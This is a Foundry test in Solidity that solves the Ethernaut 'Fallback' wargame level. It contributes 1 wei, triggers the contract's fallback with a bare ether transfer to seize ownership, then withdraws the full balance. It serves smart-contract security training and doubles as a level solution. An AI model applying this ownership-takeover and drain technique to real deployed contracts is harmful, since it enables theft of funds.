// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import "../src/01-Fallback/FallbackFactory.sol";
import "../src/Ethernaut.sol";

contract FallbackTest is Test {
    Ethernaut ethernaut;
    address playerAddress = address(6529);

    function setUp() public {
        ethernaut = new Ethernaut();
        vm.deal(playerAddress, 1 ether);
    }

    function testFallback() public {
        // Level Setup
        FallbackFactory fallbackFactory = new FallbackFactory();
        ethernaut.registerLevel(fallbackFactory);
        vm.startPrank(playerAddress);
        address levelAddress = ethernaut.createLevelInstance(fallbackFactory);
        Fallback ethernautFallback = Fallback(payable(levelAddress));

        // Level Attack

        // Contribute 1 wei to have contributions > 0
        ethernautFallback.contribute{value: 1 wei}();
        assertEq(ethernautFallback.getContribution(), 1 wei);

        // Send eth with no calldata to trigger fallback and become owner
        (bool success, ) = payable(address(ethernautFallback)).call{value: 1 wei}("");
        assertTrue(success);
        assertEq(ethernautFallback.owner(), playerAddress);

        // Withdraw all eth
        emit log_named_uint("Fallback contract balance pre withdraw", address(ethernautFallback).balance);
        ethernautFallback.withdraw();
        uint newBalance = address(ethernautFallback).balance;
        emit log_named_uint("Fallback contract balance post withdraw", newBalance);
        assertEq(newBalance, 0);

        // Level Submission
        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}
